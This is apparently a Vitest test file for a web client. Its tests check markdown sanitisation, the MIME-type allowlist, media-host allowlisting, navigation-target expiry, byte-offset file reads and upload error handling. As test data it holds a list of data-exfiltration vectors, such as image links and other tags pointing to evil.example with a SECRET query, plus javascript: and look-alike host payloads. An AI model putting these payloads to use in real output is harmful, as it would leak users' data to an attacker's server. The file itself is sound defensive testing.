// @vitest-environment jsdom
// Tests for the review fixes (311): W1 remote loads, W2/W3 blob type, W4 nav target, W7 byte offsets, hostile hosts, upload edges.
import { afterEach, describe, expect, it, vi } from 'vitest';
import { httpTransport } from '../api/http';
import { setUnauthorizedHandler, UploadError } from '../api/rpc';
import type { FileReadResult } from '../api/types';
import { readBlob, readText } from './fileRead';
import { renderMarkdown } from './markdown';
import { blobMime, classifyPreview, findMediaLinks, hostAllowed } from './media';
import { keepNavTarget, NAV_TARGET_TTL_MS, takeNavTarget } from './navStack';

const loadsRemote = (html: string): string[] => {
	const doc = new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html');
	const bad: string[] = [];
	for (const el of Array.from(doc.body.querySelectorAll('*'))) {
		const tag = el.tagName.toLowerCase();
		if (['img', 'video', 'audio', 'source', 'picture', 'svg', 'image', 'object', 'embed', 'link', 'meta', 'track', 'iframe', 'math'].includes(tag)) bad.push(tag);
		for (const a of ['src', 'srcset', 'poster', 'background', 'ping', 'data', 'xlink:href']) if (el.hasAttribute(a)) bad.push(`${tag}[${a}]`);
		if (tag !== 'a' && el.hasAttribute('href')) bad.push(`${tag}[href]`);
	}
	return bad;
};

describe('transcript markdown never produces an element that loads a remote resource (W1)', () => {
	const vectors: Record<string, string> = {
		'markdown image': '![x](https://evil.example/t.png?d=SECRET)',
		'markdown image with title': '![x](https://evil.example/t.png "t")',
		'reference image': '![x][r]\n\n[r]: https://evil.example/r.png',
		'raw img': '<img src="https://evil.example/a.png">',
		'img srcset': '<img srcset="https://evil.example/a.png 1x, https://evil.example/b.png 2x">',
		'picture/source': '<picture><source srcset="https://evil.example/s.png"><img src="x"></picture>',
		'video poster': '<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"></video>',
		audio: '<audio src="https://evil.example/a.mp3"></audio>',
		track: '<video><track src="https://evil.example/t.vtt"></video>',
		'svg image': '<svg><image href="https://evil.example/i.png"/></svg>',
		'svg use': '<svg><use xlink:href="https://evil.example/s.svg#a"/></svg>',
		'table background': '<table background="https://evil.example/bg.png"><tr><td background="https://evil.example/bg2.png">x</td></tr></table>',
		object: '<object data="https://evil.example/o"></object>',
		embed: '<embed src="https://evil.example/e">',
		link: '<link rel="stylesheet" href="https://evil.example/c.css">',
		meta: '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
		'a ping': '<a href="https://example.com" ping="https://evil.example/ping">x</a>',
		math: '<math><mi xlink:href="https://evil.example/m">x</mi></math>',
		iframe: '<iframe src="https://evil.example/f"></iframe>',
		'style url': '<p style="background:url(https://evil.example/x.png)">x</p>',
	};
	for (const [name, md] of Object.entries(vectors)) {
		it(`removes: ${name}`, () => {
			const html = renderMarkdown(md);
			expect(loadsRemote(html)).toEqual([]);
			expect(html).not.toMatch(/style=/i);
			expect(html).not.toMatch(/ping=/i);
		});
	}
	it('renders a markdown image as a plain link with the alt text, nothing is fetched', () => {
		const html = renderMarkdown('![the alt](https://evil.example/t?d=1)');
		expect(html).toContain('>the alt</a>');
		expect(html).toContain('href="https://evil.example/t?d=1"');
		expect(html).not.toContain('<img');
	});
	it('keeps only the alt text for a non-http image url, and still renders normal markdown', () => {
		expect(renderMarkdown('![just alt](javascript:alert(1))')).not.toContain('javascript:');
		const html = renderMarkdown('**bold** [ok](https://example.com)\n\n| a |\n|---|\n| 1 |');
		expect(html).toContain('<strong>bold</strong>');
		expect(html).toContain('class="tw"');
		expect(html).toContain('href="https://example.com"');
	});
});

describe('blob type is chosen by kind, never passed through (W2/W3)', () => {
	it('a pdf is always application/pdf', () => {
		expect(blobMime('x.pdf', 'application/xhtml+xml', 'pdf')).toBe('application/pdf');
		expect(blobMime('x.pdf', 'text/html', 'pdf')).toBe('application/pdf');
		expect(blobMime('x.pdf', '', 'pdf')).toBe('application/pdf');
	});
	it('image and video only get allowlisted types, otherwise octet-stream', () => {
		expect(blobMime('a.png', 'text/html', 'image')).toBe('image/png');
		expect(blobMime('a.bin', 'image/svg+xml', 'image')).toBe('application/octet-stream');
		expect(blobMime('a.bin', 'image/webp', 'image')).toBe('image/webp');
		expect(blobMime('a.mov', 'application/xml', 'video')).toBe('video/quicktime');
		expect(blobMime('a.bin', 'text/html', 'video')).toBe('application/octet-stream');
		expect(blobMime('a.txt', 'text/html', 'text')).toBe('application/octet-stream');
	});
	it('a mismatched extension and mime is not previewed', () => {
		expect(classifyPreview('x.pdf', 'application/xhtml+xml')).toBe('other');
		expect(classifyPreview('x.pdf', 'text/xml')).toBe('other');
		expect(classifyPreview('a.png', 'text/html')).toBe('other');
		expect(classifyPreview('a.png', 'application/x-msdownload')).toBe('other');
		expect(classifyPreview('a.mp4', 'text/html')).toBe('other');
		expect(classifyPreview('a.js', 'application/octet-stream')).toBe('text');
		expect(classifyPreview('a.png', 'application/octet-stream')).toBe('image');
		expect(classifyPreview('a.md', 'image/png')).toBe('other');
	});
	it('the extension wins over the mime; an unknown extension needs a clearly safe mime', () => {
		expect(classifyPreview('a.svg', 'image/svg+xml')).toBe('text');
		expect(classifyPreview('a.html', 'text/html')).toBe('text');
		expect(classifyPreview('noext', 'text/html')).toBe('other');
		expect(classifyPreview('noext', 'application/xhtml+xml')).toBe('other');
		expect(classifyPreview('data', 'image/png')).toBe('image');
	});
});

describe('hostile hosts never pass the media allowlist', () => {
	const hosts = ['annielartens.online', '*.githubusercontent.com'];
	it('hostAllowed rejects look-alikes', () => {
		for (const h of ['evil-annielartens.online', 'annielartens.online.evil.com', 'xannielartens.online', 'annielartens.online.', 'githubusercontent.com',
			'evilgithubusercontent.com', 'githubusercontent.com.evil.com', 'raw.githubusercontent.com.evil.com', 'xn--annielartens-9mb.online']) {
			expect(hostAllowed(h, hosts), h).toBe(false);
		}
		expect(hostAllowed('Raw.GitHubUserContent.com', hosts)).toBe(true);
	});
	it('findMediaLinks resolves the real host (userinfo, port, case, trailing dot, punycode, path tricks)', () => {
		const l = (u: string) => findMediaLinks(u, hosts);
		expect(l('https://annielartens.online@evil.com/x.png')).toEqual([]); // userinfo is refused outright
		expect(l('https://evil.com/annielartens.online/x.png').map((m) => hostAllowed(m.host, hosts))).toEqual([false]);
		expect(l('https://ANNIELARTENS.ONLINE/r/abc').map((m) => [m.host, hostAllowed(m.host, hosts)])).toEqual([['annielartens.online', true]]);
		expect(l('https://annielartens.online:8443/r/abc').map((m) => hostAllowed(m.host, hosts))).toEqual([true]);
		expect(l('https://annielartens.online./r/abc')).toEqual([]); // not the allowlisted name, and no media extension: ignored
		expect(l('https://\u0430nnielartens.online/r/abc')).toEqual([]); // cyrillic "a" -> punycode host: not the allowlisted name, ignored
		expect(l('https://evil.com/x.png#https://annielartens.online/a').map((m) => m.host)).toEqual(['evil.com']);
	});
});

describe('navigation target is one-shot, fresh and for one session (W4)', () => {
	const t = (nodeId: string, at: number) => ({ nodeId, at });
	it('is only taken by the session it names, while fresh', () => {
		expect(takeNavTarget(t('A', 1000), 'A', 1500)?.nodeId).toBe('A');
		expect(takeNavTarget(t('A', 1000), 'B', 1500)).toBeNull();
		expect(takeNavTarget(t('A', 1000), 'A', 1000 + NAV_TARGET_TTL_MS + 1)).toBeNull();
		expect(takeNavTarget(null, 'A', 1)).toBeNull();
	});
	it('is dropped when the hash moves elsewhere or it has expired', () => {
		expect(keepNavTarget(t('A', 1000), 'A', 1500)).toBe(true);
		expect(keepNavTarget(t('A', 1000), 'B', 1500)).toBe(false);
		expect(keepNavTarget(t('A', 1000), null, 1500)).toBe(false);
		expect(keepNavTarget(t('A', 1000), 'A', 1000 + NAV_TARGET_TTL_MS + 1)).toBe(false);
		expect(keepNavTarget(null, 'A', 1)).toBe(false);
	});
});

describe('file.read byte offsets with split multibyte characters (W7)', () => {
	const ctl = (progress: Array<[number, number]> = []) => ({ cancelled: () => false, onProgress: (a: number, b: number) => { progress.push([a, b]); } });
	const chunk = (over: Partial<FileReadResult>): FileReadResult => ({ name: 'f', mime: 'text/plain', size: 0, offset: 0, length: 0, encoding: 'utf8', data: '', eof: false, ...over });

	it('advances by the BYTE offset+length the daemon reports, not by the string length, and reports bytes as progress', async () => {
		// "é日😀" = 2 + 3 + 4 bytes but 1 + 1 + 2 UTF-16 units; the daemon aligns chunks to characters.
		const parts = [{ data: 'é', bytes: 2 }, { data: '日', bytes: 3 }, { data: '😀', bytes: 4 }];
		const asked: number[] = [];
		let at = 0;
		let i = 0;
		const read = async ({ offset }: { offset: number }) => {
			asked.push(offset);
			const p = parts[i++];
			const c = chunk({ offset: at, length: p.bytes, data: p.data, size: 9, eof: i === parts.length });
			at += p.bytes;
			return c;
		};
		const progress: Array<[number, number]> = [];
		expect(await readText(read, 'h', 9, 100, ctl(progress))).toBe('é日😀');
		expect(asked).toEqual([0, 2, 5]);
		expect(progress.map((p) => p[0])).toEqual([2, 5, 9]);
		expect(progress.every((p) => p[1] === 9)).toBe(true);
	});
	it('continues from the real end of a chunk whose start the daemon moved to a character boundary', async () => {
		const asked: number[] = [];
		let n = 0;
		const read = async ({ offset }: { offset: number }) => {
			asked.push(offset);
			n++;
			// asked for 3 but the daemon started at 4 (3 was inside a character): next read must continue at 4 + 3 = 7
			return n === 1 ? chunk({ offset: 4, length: 3, data: '日', size: 10 }) : chunk({ offset: 7, length: 3, data: '日', size: 10, eof: true });
		};
		expect(await readText(read, 'h', 10, 100, ctl())).toBe('日日');
		expect(asked).toEqual([0, 7]);
	});
	it('counts the limit in bytes: 4-byte characters reach maxBytes although they are 2 UTF-16 units', async () => {
		let at = 0;
		const read = async () => { const c = chunk({ offset: at, length: 4, data: '😀', size: 100 }); at += 4; return c; };
		await expect(readText(read, 'h', 100, 6, ctl())).rejects.toThrow(/grew/);
	});
	it('the blob type comes from the first chunk, and onFirst can refuse a file', async () => {
		const read = async () => chunk({ encoding: 'base64', data: btoa('AB'), length: 2, mime: 'image/png', eof: true });
		const blob = await readBlob(read, 'h', 2, 100, (first) => (first.mime === 'image/png' ? 'image/png' : 'application/octet-stream'), ctl());
		expect(blob.type).toBe('image/png');
		await expect(readBlob(read, 'h', 2, 100, 'image/png', { ...ctl(), onFirst: () => { throw new Error('type mismatch'); } })).rejects.toThrow('type mismatch');
	});
	it('a daemon that repeats the same offset with eof false is refused', async () => {
		const read = async () => chunk({ offset: 0, length: 3, data: 'abc', eof: false, size: 100 });
		await expect(readText(read, 'h', 100, 1000, ctl())).rejects.toThrow(/empty chunk/);
	});
});

describe('upload edge cases (httpTransport.upload)', () => {
	class FakeXhr {
		static last: FakeXhr;
		status = 0; responseText = ''; responseType = ''; withCredentials = false; aborted = false;
		headers: Record<string, string> = {}; body: FormData | null = null; method = ''; url = '';
		upload: { onprogress: ((e: { lengthComputable: boolean; loaded: number; total: number }) => void) | null } = { onprogress: null };
		onload: (() => void) | null = null; onerror: (() => void) | null = null; onabort: (() => void) | null = null; ontimeout: (() => void) | null = null;
		constructor() { FakeXhr.last = this; }
		open(m: string, u: string) { this.method = m; this.url = u; }
		setRequestHeader(k: string, v: string) { this.headers[k] = v; }
		send(b: FormData) { this.body = b; }
		abort() { this.aborted = true; this.onabort?.(); }
		respond(status: number, text: string) { this.status = status; this.responseText = text; this.onload?.(); }
	}
	afterEach(() => { vi.unstubAllGlobals(); setUnauthorizedHandler(() => {}); });
	const start = () => {
		vi.stubGlobal('XMLHttpRequest', FakeXhr);
		const progress: number[] = [];
		const h = httpTransport.upload('node1', new File(['abc'], 'a b.png', { type: 'image/png' }), (f) => progress.push(f));
		return { h, x: FakeXhr.last, progress };
	};

	it('posts multipart with the CSRF header, nodeId first, and resolves the server answer', async () => {
		const { h, x, progress } = start();
		expect(x.method).toBe('POST');
		expect(x.url).toBe('/api/attachments');
		expect(x.headers['X-Tessyn-Client']).toBe('web');
		expect(x.withCredentials).toBe(true);
		expect(x.headers['Content-Type']).toBeUndefined(); // the browser sets the multipart boundary
		expect([...x.body!.keys()]).toEqual(['nodeId', 'file']);
		expect(x.body!.get('nodeId')).toBe('node1');
		x.upload.onprogress?.({ lengthComputable: true, loaded: 1, total: 4 });
		x.respond(200, JSON.stringify({ attachmentId: 'id', path: 'C:\\a\\a b.png', name: 'a b.png', size: 3, mime: 'image/png' }));
		expect((await h.promise).path).toBe('C:\\a\\a b.png');
		expect(progress).toEqual([0.25, 1]);
	});
	it('401 logs out (even mid-upload)', async () => {
		let out = 0;
		setUnauthorizedHandler(() => { out++; });
		const { h, x } = start();
		x.respond(401, '');
		await expect(h.promise).rejects.toMatchObject({ name: 'UploadError', status: 401 });
		expect(out).toBe(1);
	});
	it('a non-JSON 413 from the proxy becomes a readable message; JSON errors keep the server text', async () => {
		const a = start();
		a.x.respond(413, '<html>413 Request Entity Too Large</html>');
		await expect(a.h.promise).rejects.toMatchObject({ status: 413, message: 'The file is too large' });
		const b = start();
		b.x.respond(503, JSON.stringify({ error: 'The desktop is offline' }));
		await expect(b.h.promise).rejects.toMatchObject({ status: 503, message: 'The desktop is offline' });
		const c = start();
		c.x.respond(502, 'Bad gateway');
		await expect(c.h.promise).rejects.toMatchObject({ status: 502, message: 'Upload failed (502)' });
	});
	it('a 200 without a path is an error, a network error is status 0', async () => {
		const a = start();
		a.x.respond(200, '{}');
		await expect(a.h.promise).rejects.toBeInstanceOf(UploadError);
		const b = start();
		b.x.onerror?.();
		await expect(b.h.promise).rejects.toMatchObject({ status: 0 });
	});
	it('abort (cancel, or the composer unmounting on a session switch) rejects with status -1 and aborts the request', async () => {
		const { h, x } = start();
		h.abort();
		expect(x.aborted).toBe(true);
		await expect(h.promise).rejects.toMatchObject({ status: -1 });
	});
});
